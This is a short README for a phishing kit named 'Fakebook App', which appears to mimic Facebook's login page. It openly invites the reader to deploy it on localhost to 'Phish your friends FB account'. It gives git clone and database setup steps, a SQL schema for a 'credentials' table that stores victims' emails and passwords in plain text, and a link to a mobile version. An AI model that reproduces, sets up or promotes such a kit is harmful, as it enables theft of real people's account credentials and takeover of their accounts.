# Fakebook App

Play around and deploy to your localhost to Phish your friends FB account.

#Installation
*   Git Clone https://github.com/jiwom/fakebook-mini.git
*   Set your DB connection inside db.php

##Execute this query to your machine

DROP TABLE IF EXISTS `credentials`;
CREATE TABLE `credentials` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `email` text,
  `password` text,
  PRIMARY KEY (`id`)
)

Go to http://fakebook-mini.dev/mobile for the mobile version of it
